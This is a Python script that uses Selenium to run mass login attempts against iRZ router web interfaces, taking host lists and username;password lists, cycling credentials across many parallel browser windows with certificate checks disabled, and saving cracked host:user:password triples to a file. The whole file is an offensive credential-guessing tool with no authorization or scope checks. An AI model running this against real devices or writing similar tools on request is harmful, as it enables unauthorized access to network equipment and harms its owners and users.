import argparse
import datetime
import sys
import time
from collections import deque
from dataclasses import dataclass
from pathlib import Path
from threading import Lock, Thread
from typing import Deque, List, Optional, Tuple

from selenium import webdriver
from selenium.common.exceptions import NoAlertPresentException, TimeoutException, WebDriverException
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.ie.options import Options as IeOptions
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait


DEFAULT_ATTEMPTS = 3
LOGIN_TEXT = "auth"


@dataclass
class HostEntry:
    address: str
    attempts: int = DEFAULT_ATTEMPTS

    def decrement_attempt(self) -> None:
        self.attempts = max(0, self.attempts - 1)

    @property
    def is_exhausted(self) -> bool:
        return self.attempts <= 0


@dataclass
class CredentialEntry:
    username: str
    password: str

    def as_pair(self) -> Tuple[str, str]:
        return self.username, self.password


@dataclass
class AutomationContext:
    browser: str
    credential_queue: Deque[CredentialEntry]
    credential_lock: Lock
    host_lock: Lock
    hosts: Deque[HostEntry]
    output_file: Path
    multiwindow: int


class LoginOutcome:
    SUCCESS = "success"
    RETRY_CREDENTIAL = "retry_credential"
    FAIL = "fail"


def log_line(message: str) -> None:
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[{timestamp}] {message}")


def parse_file_lines(path: Path, separator: str) -> List[Tuple[str, str]]:
    if not path.exists():
        raise FileNotFoundError(f"File not found: {path}")

    pairs: List[Tuple[str, str]] = []
    with path.open("r", encoding="utf-8") as handle:
        for raw in handle:
            line = raw.strip()
            if not line:
                continue
            if separator not in line:
                continue
            left, right = line.split(separator, 1)
            pairs.append((left.strip(), right.strip()))
    return pairs


def create_driver(browser: str) -> webdriver.Remote:
    if browser.lower() == "ie":
        options = IeOptions()
        options.ignore_zoom_level = True
        options.ensure_clean_session = True
        options.add_additional_option("ie.ensureCleanSession", True)
        driver = webdriver.Ie(options=options)
    else:
        chrome_options = ChromeOptions()
        chrome_options.add_argument("--ignore-certificate-errors")
        chrome_options.add_argument("--start-maximized")
        driver = webdriver.Chrome(options=chrome_options)
    driver.set_page_load_timeout(30)
    return driver


def wait_for_page(driver: webdriver.Remote, timeout: int = 10) -> bool:
    try:
        WebDriverWait(driver, timeout).until(
            lambda drv: drv.execute_script("return document.readyState") == "complete"
        )
        return True
    except TimeoutException:
        return False


def try_load(driver: webdriver.Remote, base: str) -> bool:
    try:
        driver.get(base)
    except (TimeoutException, WebDriverException):
        return False
    except Exception:
        return False
    return wait_for_page(driver)


def find_irz_anchor(driver: webdriver.Remote) -> Optional[webdriver.remote.webelement.WebElement]:
    candidates = [
        (By.XPATH, "//a[@href='cgi-bin/index.cgi']"),
        (By.XPATH, "//li[a[@href='#tools']]"),
    ]
    for by, selector in candidates:
        elements = driver.find_elements(by, selector)
        if elements:
            return elements[0]
    return None


def handle_auth_prompt(driver: webdriver.Remote, credential: CredentialEntry) -> None:
    try:
        alert = driver.switch_to.alert
    except NoAlertPresentException:
        return

    combined = f"{credential.username}\t{credential.password}\n"
    try:
        alert.send_keys(combined)
        alert.accept()
    except WebDriverException:
        alert.dismiss()


def fill_html_form(driver: webdriver.Remote, credential: CredentialEntry) -> bool:
    user_inputs = driver.find_elements(By.XPATH, "//input[translate(@type, 'TEXT', 'text')='text' or @name='username' or contains(translate(@placeholder, 'USERNAME', 'username'), 'username')]")
    pass_inputs = driver.find_elements(By.XPATH, "//input[@type='password' or @name='password' or contains(translate(@placeholder, 'PASSWORD', 'password'), 'password')]")

    if not user_inputs or not pass_inputs:
        return False

    user_inputs[0].clear()
    user_inputs[0].send_keys(credential.username)
    pass_inputs[0].clear()
    pass_inputs[0].send_keys(credential.password)
    pass_inputs[0].send_keys(Keys.ENTER)
    return True


def perform_login_flow(driver: webdriver.Remote, credential: CredentialEntry) -> str:
    handle_auth_prompt(driver, credential)
    form_filled = fill_html_form(driver, credential)

    time.sleep(2)

    try:
        driver.switch_to.alert
        return LoginOutcome.RETRY_CREDENTIAL
    except NoAlertPresentException:
        pass

    page_text = driver.page_source.lower()
    if LOGIN_TEXT in page_text:
        return LoginOutcome.RETRY_CREDENTIAL

    if form_filled:
        return LoginOutcome.SUCCESS
    return LoginOutcome.FAIL


def process_host(ctx: AutomationContext, host: HostEntry) -> None:
    credential: Optional[CredentialEntry] = None
    driver: Optional[webdriver.Remote] = None
    try:
        driver = create_driver(ctx.browser)
        urls = [f"http://{host.address}", f"https://{host.address}"]

        loaded_url = None
        for url in urls:
            if try_load(driver, url):
                loaded_url = url
                break

        if not loaded_url:
            host.decrement_attempt()
            log_line(f"[{host.address}] [n/a] [Failed] (connection)")
            return

        if "irz" not in driver.title.lower():
            host.decrement_attempt()
            log_line(f"[{host.address}] [n/a] [Failed] (missing iRZ)")
            return

        anchor = find_irz_anchor(driver)
        if anchor:
            try:
                anchor.click()
                wait_for_page(driver)
            except WebDriverException:
                pass

        while True:
            with ctx.credential_lock:
                if not ctx.credential_queue:
                    host.decrement_attempt()
                    log_line(f"[{host.address}] [n/a] [Failed] (no credentials left)")
                    return
                credential = ctx.credential_queue.popleft()
                ctx.credential_queue.append(credential)

            outcome = perform_login_flow(driver, credential)
            if outcome == LoginOutcome.SUCCESS:
                ctx.output_file.parent.mkdir(parents=True, exist_ok=True)
                with ctx.output_file.open("a", encoding="utf-8") as handle:
                    handle.write(f"{host.address}:{credential.username}:{credential.password}\n")
                log_line(f"[{host.address}] [{credential.username}:{credential.password}] [Success]")
                return

            if outcome == LoginOutcome.FAIL:
                host.decrement_attempt()
                log_line(f"[{host.address}] [{credential.username}:{credential.password}] [Failed] (unhandled)")
                return

            host.decrement_attempt()
            if host.is_exhausted:
                log_line(f"[{host.address}] [{credential.username}:{credential.password}] [Failed] (auth, attempts exhausted)")
                return

            log_line(f"[{host.address}] [{credential.username}:{credential.password}] [Failed] (auth)")
            time.sleep(1)
    except Exception as exc:  # catch-all to keep worker thread alive
        host.decrement_attempt()
        log_line(
            f"[{host.address}] [{credential.username if credential else 'n/a'}] "
            f"[Failed] (error: {exc.__class__.__name__})"
        )
        return
    finally:
        if driver:
            driver.quit()


def worker(ctx: AutomationContext) -> None:
    while True:
        with ctx.host_lock:
            if not ctx.hosts:
                return
            host = ctx.hosts.popleft()

        process_host(ctx, host)

        with ctx.host_lock:
            if not host.is_exhausted and host not in ctx.hosts:
                ctx.hosts.append(host)


def build_context(args: argparse.Namespace) -> AutomationContext:
    host_pairs = parse_file_lines(Path(args.host_file), ":")
    hosts = deque(HostEntry(address=f"{ip}:{port}") for ip, port in host_pairs)

    credential_pairs = parse_file_lines(Path(args.credential_file), ";")
    credential_queue = deque(CredentialEntry(username=user, password=pwd) for user, pwd in credential_pairs)

    return AutomationContext(
        browser=args.browser,
        credential_queue=credential_queue,
        credential_lock=Lock(),
        host_lock=Lock(),
        hosts=hosts,
        output_file=Path(args.output),
        multiwindow=args.multiwindow,
    )


def prompt_for_missing(args: argparse.Namespace) -> None:
    if not args.credential_file:
        args.credential_file = input("Path to credentials file (username;password): ").strip()
    if not args.host_file:
        args.host_file = input("Path to hosts file (IP:Port): ").strip()
    if args.multiwindow is None:
        raw = input("Number of windows: ").strip()
        args.multiwindow = int(raw) if raw else 1


def main(argv: Optional[List[str]] = None) -> int:
    parser = argparse.ArgumentParser(description="Automate iRZ login attempts")
    parser.add_argument("--credential-file", dest="credential_file", help="Path to txt with username;password entries")
    parser.add_argument("--host-file", dest="host_file", help="Path to txt with IP:Port entries")
    parser.add_argument("--multiwindow", type=int, help="Number of concurrent browser windows")
    parser.add_argument("--browser", choices=["chromium", "ie"], default="chromium", help="Browser type")
    parser.add_argument("--output", default="g.txt", help="Output file for successful logins")

    args = parser.parse_args(argv)
    prompt_for_missing(args)

    ctx = build_context(args)
    if not ctx.hosts:
        log_line("No hosts to process.")
        return 1
    if not ctx.credential_queue:
        log_line("No credentials to process.")
        return 1

    threads: List[Thread] = []
    for _ in range(max(1, ctx.multiwindow)):
        thread = Thread(target=worker, args=(ctx,), daemon=True)
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    log_line("Processing complete.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
